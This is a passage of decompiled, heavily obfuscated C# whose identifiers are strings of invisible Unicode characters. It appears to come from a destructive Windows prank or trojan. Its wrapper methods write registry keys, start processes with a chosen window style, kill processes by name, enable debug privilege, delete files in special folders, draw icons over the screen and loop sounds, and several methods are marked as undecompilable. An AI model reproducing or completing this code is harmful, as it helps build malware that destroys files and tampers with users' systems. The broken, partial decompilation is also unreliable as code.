  public \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮()
  {
    // ISSUE: unable to decompile the method.
  }

  static void \u206E‏‬‫⁪‬‍‭⁪‫⁭‫‫⁭⁯‮‍⁭‌⁫⁯⁫⁬‮‪‏⁫⁬‎‪⁮‎‪‮‫⁪‫⁮⁭⁯‮([In] int obj0) => Thread.Sleep(obj0);

  static RegistryKey \u206C‬‎⁫‭‪⁬‬⁫‌‮‮‎‍‏⁪‭⁯‪⁪⁯‪⁪⁮‪⁬‍⁪‮‍‎‮‫⁭⁭‎​‬‪⁯‮([In] RegistryKey obj0, [In] string obj1)
  {
    return obj0.CreateSubKey(obj1);
  }

  static void \u202A⁮‫⁫‎‫‪⁬⁬‏​⁬⁭⁮⁯⁬⁪⁮⁬‭⁫⁮⁬‎‪‪‬‍‭⁮‬‭‫‬‌‎⁫⁭‌⁬‮(
    [In] RegistryKey obj0,
    [In] string obj1,
    [In] object obj2,
    [In] RegistryValueKind obj3)
  {
    obj0.SetValue(obj1, obj2, obj3);
  }

  static void \u200D‪‪⁯⁮‬​⁮‭⁭⁭⁮⁭‬⁯‏‪‏‌‫⁪⁫‫⁭‌⁬⁯‌‭⁭⁫⁬⁫‍​⁭⁬⁯‍⁯‮(
    [In] RegistryKey obj0,
    [In] string obj1,
    [In] object obj2)
  {
    obj0.SetValue(obj1, obj2);
  }

  static ProcessStartInfo \u202A‏⁯⁯‮​‪‏‮‬⁮⁪⁯‫‍⁫‬⁬‪⁯⁫⁫⁪‪⁯⁭‏⁫⁪‏‪‍‫‮‌⁮‮‮⁭‫‮()
  {
    return new ProcessStartInfo();
  }

  static void \u202B‮‬‪‌⁭⁬⁯⁮⁫⁫‎⁪‮‏⁯‏‌⁬​⁪⁯‍‫⁬⁭‭‌⁯⁫‪⁮‭⁭​‭‭⁬‌‍‮([In] ProcessStartInfo obj0, [In] string obj1)
  {
    obj0.FileName = obj1;
  }

  static void \u200E⁪⁪‬‪‫‭‏‎⁯⁬‭‬⁫‬‏⁮‍‭‎‎⁮‌‪⁯‎⁭‪‏⁪‍⁮⁮‪⁮⁪‫‬​⁬‮(
    [In] ProcessStartInfo obj0,
    [In] ProcessWindowStyle obj1)
  {
    obj0.WindowStyle = obj1;
  }

  static void \u206A‮⁮​‌‫‮‭⁬‍‏​⁬⁫​‍⁬‫‎‫⁫‏‭⁭‭⁮⁬‬⁭⁪​⁪⁫‎⁪‮‮‍⁪‮([In] ProcessStartInfo obj0, [In] string obj1)
  {
    obj0.Arguments = obj1;
  }

  static Process \u202C⁪⁬‍‮‌‫⁬‪⁮⁪‏‮‫‮‬‏‫‮⁪⁭‍‏⁬‌‮‏‌⁭⁯⁫⁫‏⁬‫‬​‮‮([In] ProcessStartInfo obj0)
  {
    return Process.Start(obj0);
  }

  static Process \u206D⁮⁬​⁭⁬​‏⁫‫⁮‍‭‭‫⁪‍‫‌⁮‪⁮‮‏‬‬​‏⁮‮⁬​‏⁫⁭⁮‮​‭‎‮([In] string obj0)
  {
    return Process.Start(obj0);
  }

  static Thread \u200E‎‪⁪‍‍⁬‎⁫‌‎⁭⁯‫⁯‬⁬⁬‏‏‪‬‌‭‭‭‍⁮‬‍⁯‏‎‌⁭⁪‭‌‮‍‮([In] ThreadStart obj0)
  {
    return new Thread(obj0);
  }

  static void \u200B‬⁫‪⁭‪‎‎‌​⁯‭‬‪​⁬‪‎⁭⁭‍‌‪⁭‪⁫‭‭⁪‍⁮‭⁫⁯⁭‫‪​‎⁪‮([In] Thread obj0) => obj0.Start();

  static Process[] \u206C⁫‎‍‎⁮‮‫‎‏⁮‪‎‍‬‍‏‍‪‮‪​‌‫‎‏‏‫‎‍‭‭⁯⁫‏​‬‎⁯‭‮([In] string obj0)
  {
    return Process.GetProcessesByName(obj0);
  }

  static void \u202C‌⁪⁫‬⁪⁮⁪‌⁯‌‎⁪⁯‏‭⁮‫‍‬‌⁪‪‍‍‫⁮⁭⁭⁭‬‮⁭⁬‮⁫‫⁬‫‫‮([In] Process obj0) => obj0.Kill();

  static void \u202A⁪‭‪‎⁮‌⁫⁭‌⁭​⁮⁭​‬⁪‮‮‮‌⁪‬‫‪⁫‪‭⁪‫‎‬​‮⁫⁭‫‍‏‏‮([In] Array obj0, [In] RuntimeFieldHandle obj1)
  {
    RuntimeHelpers.InitializeArray(obj0, obj1);
  }

  static void \u202A⁯⁬⁪⁫⁫⁪​‍‭‪⁭⁪‎‌‫‪‭⁪‍‪‎‌‏⁪‬⁪‍⁫‏⁫‎‌‌‏‍‬‮⁮‫‮([In] Thread obj0) => obj0.Abort();

  static string \u206D‫⁪⁫‌⁪‭​‬‭⁯‎⁪​⁬‭​‌⁮‭‌⁯‍‎‬‫‎‎⁭⁫‪⁪‪⁬‏‮⁫‪‏‪‮([In] Environment.SpecialFolder obj0)
  {
    return Environment.GetFolderPath(obj0);
  }

  static string[] \u202D⁮‫‪‬‪⁬‮‏‌‭‌​⁯‭‌⁪‭⁬‎‮‎‮‌‍‌‫⁬‪⁯⁬⁪⁯‎‫‏​‍‬‌‮([In] string obj0)
  {
    return Directory.GetFiles(obj0);
  }

  static void \u206A⁪⁪⁮‮‎⁯⁪⁬⁯⁪⁭⁪‬‬‭⁭⁫‏​‭‭‎‭⁯⁬⁯⁮‪⁫‭⁪⁪‬⁪⁯⁬⁬‫⁪‮([In] string obj0) => File.Delete(obj0);

  static Graphics \u206F‏⁭‪‮​‬‫⁫‍⁬​‎⁭⁪‌​⁯⁬‪⁬‏‪‌‍‫⁯‎⁯‫‍⁫‎⁯⁪​‮⁭⁫‌‮([In] IntPtr obj0)
  {
    return Graphics.FromHdc(obj0);
  }

  static int \u202C⁮‭‎⁮‭‫‍⁫‍⁭‌‫⁯‬⁫‪⁫⁪‏⁬⁭⁮‌⁭‪⁬‮⁮⁬⁭⁪⁮⁫‫‍⁯‭‭‏‮([In] Random obj0, [In] int obj1)
  {
    return obj0.Next(obj1);
  }

  static Icon \u200D‏‌​⁮‪⁮⁯‬‮‍‮‭⁪⁯⁪⁫⁯‎⁬‪​‌​‭‫⁫⁭‬⁪‏‭⁮⁪‌‬‬​‫⁭‮([In] string obj0) => new Icon(obj0);

  static void \u202B‫‌‫‮⁮⁮‍‎​⁭‬‏‮⁪‎‍‎‭‭‬‍⁬‎‫‎‮‬‍‫‬‪‌‫⁭‏​⁪‫⁯‮(
    [In] Graphics obj0,
    [In] Icon obj1,
    [In] int obj2,
    [In] int obj3)
  {
    obj0.DrawIcon(obj1, obj2, obj3);
  }

  static void \u206E⁫‬‮⁯⁪‬‏‫‭⁮‮‍‪‎‪⁪⁫‪⁯⁯⁭​‬⁮​‬⁪‍⁯⁯‫‬⁪⁫⁮‮⁪​⁪‮([In] IDisposable obj0)
  {
    obj0.Dispose();
  }

  static SoundPlayer \u206B‍‫⁭‍⁬‌⁫​‏‏‏‍‪‭⁫‬‏‭‏‫⁫‫⁪⁬‌⁬⁯‬‌⁭⁬⁭‬⁮‬⁯‫⁮⁮‮([In] string obj0)
  {
    return new SoundPlayer(obj0);
  }

  static void \u200D⁯‮‪‍‮‎‏‏‌⁪‬‍‌⁪‌⁯⁭⁬‬⁪‬​⁯​‮⁭⁬‎​‏⁫⁬‪‎⁬⁯⁯‮‎‮([In] SoundPlayer obj0) => obj0.Play();

  static void \u202A⁭‍⁭​‭‌‭‬⁫‬‬‭⁭‬⁮​‎‮‪‍​⁯‌⁮⁫⁭‎⁮‏⁬‫‌‍⁯⁮‎‏‪‮‮() => Process.EnterDebugMode();

  static Process \u206D‎‪‍⁭⁮​⁯⁯⁫‭‭‎‍‍⁭⁪⁪⁯‮‫‍‭‏‮⁪⁭‬​⁯​⁭‬‪⁯⁭⁭‪‪⁮‮() => Process.GetCurrentProcess();

  static IntPtr \u206F‌‏‭‪‌‎‭⁭‬⁯‎‎⁯⁪‍⁪‍‬‏⁬‫‎⁫​‬⁫‪‎⁬‌⁪‏⁪⁬‎⁫‎‎‮‮([In] Process obj0) => obj0.Handle;

  static int \u206E‍‌‭⁭‍⁬‬‌‎‭⁮⁫‭‏‏⁪⁮⁯‍‍‬⁪‫‌⁯‏​‫‎‪⁯⁭⁪⁮‭‬‮⁪‌‮([In] Random obj0, [In] int obj1, [In] int obj2)
  {
    return obj0.Next(obj1, obj2);
  }

  static void \u200D‬⁪‪⁭‭⁭⁫‎‌‍⁭‎‏‪‎‮‏‎⁪‪‫‍‎‭‌⁪⁯‌‭‏​‮‪​​‫‫‫⁭‮([In] int obj0)
  {
    Environment.Exit(obj0);
  }

  static Random \u206E⁭⁬‮‌⁫‍⁬⁮‌⁯‎​⁮‮⁮⁪⁮‪‪⁮‍‌​‭‌‏⁬‬‮‪‌‍‎‭⁯‬‍⁯‭‮() => new Random();

  static void \u206D‭‏⁯‬‌‎‪‪‏‫⁮‫‎​‫⁯‮⁬‫⁯‫⁮⁫‏‍‮⁫⁪⁬‌‫‭‪‍​‌⁮‏‫‮([In] SoundPlayer obj0)
  {
    obj0.PlayLooping();
  }

  static Screen \u202D⁮⁪‌‏‍‌‬‌‪‬‫‭‌⁪‎‍‌‪‬‫‎‌⁭‫​‭‏⁭⁮‏‍‌⁭‌‍⁮‫⁫‍‮() => Screen.PrimaryScreen;

  static Rectangle \u202E⁮⁯‎⁭⁫‌⁬⁪‭‫⁭‮​‮‏‌‎‪‍‫⁭‌⁬⁫‮‍‌‫‭⁫‮⁮⁯⁯⁮‬⁪‏‎‮([In] Screen obj0) => obj0.Bounds;

  private enum \u206E‬‌‪​⁭⁮⁬‌⁯‎‪‮⁯⁯⁭⁬⁬‫⁯⁬‭⁫‭‍‎⁭⁮‮‌‎‌⁭‍​​‎‏⁭⁯‮
  {
    PS_COSMETIC = 0,
    PS_ENDCAP_ROUND = 0,
    PS_JOIN_ROUND = 0,
    PS_SOLID = 0,
    PS_DASH = 1,
    PS_DOT = 2,
    PS_DASHDOT = 3,
    PS_DASHDOTDOT = 4,
    PS_NULL = 5,
    PS_INSIDEFRAME = 6,
    PS_USERSTYLE = 7,
    PS_ALTERNATE = 8,
    PS_STYLE_MASK = 15, // 0x0000000F
    PS_ENDCAP_SQUARE = 256, // 0x00000100
    PS_ENDCAP_FLAT = 512, // 0x00000200
    PS_ENDCAP_MASK = 3840, // 0x00000F00
    PS_JOIN_BEVEL = 4096, // 0x00001000
    PS_JOIN_MITER = 8192, // 0x00002000
    PS_JOIN_MASK = 61440, // 0x0000F000
    PS_GEOMETRIC = 65536, // 0x00010000
    PS_TYPE_MASK = 983040, // 0x000F0000
  }

  private enum \u202D‍‌⁮‮‫‫‏‪⁭‬⁫⁬‫‎⁯‮‭‍‬⁮‫⁯‬⁯‏‪⁪‬‫⁯⁪‫⁯‭‬‭⁬⁯‬‮ : uint
  {
    BLACKNESS = 66, // 0x00000042
    NOTSRCERASE = 1114278, // 0x001100A6
    NOTSRCCOPY = 3342344, // 0x00330008
    SRCERASE = 4457256, // 0x00440328
    DSTINVERT = 5570569, // 0x00550009
    PATINVERT = 5898313, // 0x005A0049
    SRCINVERT = 6684742, // 0x00660046
    SRCAND = 8913094, // 0x008800C6
    MERGEPAINT = 12255782, // 0x00BB0226
    MERGECOPY = 12583114, // 0x00C000CA
    SRCCOPY = 13369376, // 0x00CC0020
    SRCPAINT = 15597702, // 0x00EE0086
    PATCOPY = 15728673, // 0x00F00021
    PATPAINT = 16452105, // 0x00FB0A09
    WHITENESS = 16711778, // 0x00FF0062
    CAPTUREBLT = 1073741824, // 0x40000000
  }

  public struct \u206B‫⁯⁯⁭‪⁫‪‫‎⁫‎⁭‭⁪⁪‭⁭⁪‭⁮⁯⁭⁪‏⁬⁬‫⁫‫⁯​⁭⁮‍​⁯‮‮‍‮
  {
    public int \u206E‬‫‎⁭⁫‪‬⁫‎‪‎⁯‮‌‮⁯‬⁭⁭⁮‎‍‎‌‮⁮⁪‪‪‬⁮‪⁪‍‭‬‭​⁯‮;
    public int \u202C⁪‪‎‎‪⁪‮​‏‫‫‪‭⁭⁫⁮⁬⁬⁯‌⁮‪‬‏​⁯​⁭⁯⁭‏‍⁪‬‫‎⁯⁮‌‮;

    public \u206B‫⁯⁯⁭‪⁫‪‫‎⁫‎⁭‭⁪⁪‭⁭⁪‭⁮⁯⁭⁪‏⁬⁬‫⁫‫⁯​⁭⁮‍​⁯‮‮‍‮(int x, int y)
    {
      // ISSUE: unable to decompile the method.
    }

    [SpecialName]
    public static Point \u206B‬‌‭​​‪‍‏‍⁭‌‏⁪‍‫‌‮⁭‭⁮⁫⁯‫‏‎⁬⁭‫⁫‎‫‏⁭⁭‌‎⁭‮⁪‮(
      \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u206B‫⁯⁯⁭‪⁫‪‫‎⁫‎⁭‭⁪⁪‭⁭⁪‭⁮⁯⁭⁪‏⁬⁬‫⁫‫⁯​⁭⁮‍​⁯‮‮‍‮ _param0)
    {
      // ISSUE: unable to decompile the method.
    }

    [SpecialName]
    public static \u202B‏‭‪‮⁫‫⁮⁬‫‪‍‮‫​‪⁯​‍‏‫‫‬‍⁪‪⁪‭⁬‏‍‎‎⁫‌‮‍‌‏‬‮.\u206B‫⁯⁯⁭‪⁫‪‫‎⁫‎⁭‭⁪⁪‭⁭⁪‭⁮⁯⁭⁪‏⁬⁬‫⁫‫⁯​⁭⁮‍​⁯‮‮‍‮ \u206B‬‌‭​​‪‍‏‍⁭‌‏⁪‍‫‌‮⁭‭⁮⁫⁯‫‏‎⁬⁭‫⁫‎‫‏⁭⁭‌‎⁭‮⁪‮(
      Point _param0)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public struct \u200D⁯​​‍⁪⁭‮‮⁬⁯‎⁮‍‭‎‌‌‪⁬‍‫‪⁭⁫‍⁬‌‍‫⁬⁬‏‬⁬‫‍‬⁬⁫‮
  {
    private byte \u202D‍⁯‫‪⁯‭‏‪‭‫​‮‌‌‪‏⁮⁯‬‫‎‌‎‏⁪‏‪‏‬⁪‎‫‌⁮‮⁬‭⁬⁫‮;
    private byte \u206B‬‮‮‬⁪‍⁫⁮‬⁭⁫⁯‫‏‌⁮⁫⁯​⁬⁪‍⁪‎‭⁭‭⁪‌‎⁫⁮​‭‭‌‌‎‮‮;
    private byte \u206D⁭‮‬⁮‎‪‎‭⁪⁮⁭‌​‪‫⁯⁮‍⁭⁮‭‭​‪⁮‭⁪‭⁬⁮⁭⁫​‎‮⁯‌⁬‮;
    private byte \u200B⁬‫‭⁫‏‫‬‬​‫‎⁫‫‏​​‎⁮⁫‎‎‎‎​⁬⁫‏⁬⁮⁯⁬‬​‬⁮‬⁫‪⁪‮;

    public \u200D⁯​​‍⁪⁭‮‮⁬⁯‎⁮‍‭‎‌‌‪⁬‍‫‪⁭⁫‍⁬‌‍‫⁬⁬‏‬⁬‫‍‬⁬⁫‮(
      byte op,
      byte flags,
      byte alpha,
      byte format)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public struct \u202A⁬⁪⁫‬‮⁭‍​⁪‍‮⁫‬‍‏‭‪⁯‬‬‎‬‫⁪⁮‫‎⁪‭⁮‬⁯⁮‮‌⁫‬‫⁮‮
  {
    public uint \u206D⁪⁯‎‬‌⁯⁭⁬‪⁯‮‍‫‏⁯⁯⁯‮‮‬‍‪​‫‌‭‪‍‫‏‭⁭⁮‌⁮⁮‌⁬‮;
    public uint \u206F‮⁭⁮⁮‬‭⁮‫⁯⁬​‏⁪⁮⁪‫⁯‍⁬​‎‍⁮​​‌⁪⁪‎‍⁭‏‌‬⁪‭⁯‬‏‮;

    public \u202A⁬⁪⁫‬‮⁭‍​⁪‍‮⁫‬‍‏‭‪⁯‬‬‎‬‫⁪⁮‫‎⁪‭⁮‬⁯⁮‮‌⁫‬‫⁮‮(uint upLeft, uint lowRight)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public struct \u200C‭‭‬⁫⁬‏‫⁬​​‪​‏‏‪⁬‏⁭​‭‮‮​‮‭⁪⁬‬⁫‎⁮⁯​‎‭‍​‍‏‮
  {
    public int \u206A⁫‬‎⁭‏‌⁭‭⁫‌‫‏‫​‏‎⁯‭‬‎‫‌‪‭⁮⁭‌‏⁭‌⁬⁬‮⁪⁬‏‌‎‍‮;
    public int \u202C‭‎‪‬‬‫‌‫‫‏‭⁪‎⁮‫⁫‭⁪⁬‪⁮‏⁪‪⁫‎​⁯‮⁭⁮‮⁬⁬⁫⁯‮​⁪‮;
    public ushort \u200C⁭⁪⁭⁬⁭‎⁭⁭‫‫‎‬⁬⁯⁮⁮‌⁭⁬‮⁪‌⁯‌‪‪⁫‪⁪⁮⁯‍⁪⁪‮‬‏‌⁯‮;
    public ushort \u202C‬‪⁬‭​‭‪⁫‏⁮‪‎⁯‭⁭⁫‫⁪⁮‏‪‎‎‪‌‭⁯‪‎⁪‪‫​​‬⁫⁪​⁪‮;
    public ushort \u202D​⁫‍⁬⁮⁭‏⁭⁫‌‮‏‪⁫‬⁭‪‍⁯‫‮‫⁯‏​‭‮‌‬‮⁭⁯‪⁪‎‎‎​‏‮;
    public ushort \u206A‏⁮‏‫⁯‎⁬​‭​‪⁮⁫⁯‌‌‫‌‍⁭​‬⁪⁯‏⁫‌‎‮⁪​⁬⁪‮‬⁬‪‪‫‮;

    public \u200C‭‭‬⁫⁬‏‫⁬​​‪​‏‏‪⁬‏⁭​‭‮‮​‮‭⁪⁬‬⁫‎⁮⁯​‎‭‍​‍‏‮(
      int x,
      int y,
      ushort red,
      ushort green,
      ushort blue,
      ushort alpha)
    {
      // ISSUE: unable to decompile the method.
    }
  }

  public enum \u206C‮‏‍​‪⁬⁫⁮‭⁮‏⁮‫‬​‌‫‭‎⁪‪‌⁫⁯‏‭‍⁯⁮‎‏‍⁭‎‌⁮‌⁪‎‮ : uint
  {
    RECT_H = 0,
    RECT_V = 1,
    TRIANGLE = 2,
    OP_FLAG = 255, // 0x000000FF
  }

  public struct \u206D⁯⁬‮‬‏‪⁮‬‎‎‭‬⁯​‎⁪⁯⁫‌⁭‌‭⁫‏⁬‎⁪‮‪⁬‮‭⁫⁫⁫‪‬‍⁮‮
  {
    public uint \u200C‮‏‭‎‪‪⁫‬⁫​​⁯‬‮‏‪‫‭‭‫‭‎‬‏‫‍‪⁭‍‪⁪‮⁯‎‪‬⁭⁯‌‮;
    public uint \u206C⁯‍‎⁫⁬⁯⁭‏⁬‫⁪‬⁫‮⁮⁭‮⁯‮‎‬​‏⁫‮⁮‫‏​‫‫‍‎‫⁭⁫‬‌‭‮;
    public uint \u202B‮‍‪‫⁭⁬‮‪‌⁬⁫⁫⁯‬‬⁯⁮‌‏‬‪‍⁫‮‫⁯⁪‏⁫⁬‌‎⁯‭‭‭⁬‌‬‮;

    public \u206D⁯⁬‮‬‏‪⁮‬‎‎‭‬⁯​‎⁪⁯⁫‌⁭‌‭⁫‏⁬‎⁪‮‪⁬‮‭⁫⁫⁫‪‬‍⁮‮(uint vertex1, uint vertex2, uint vertex3)
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
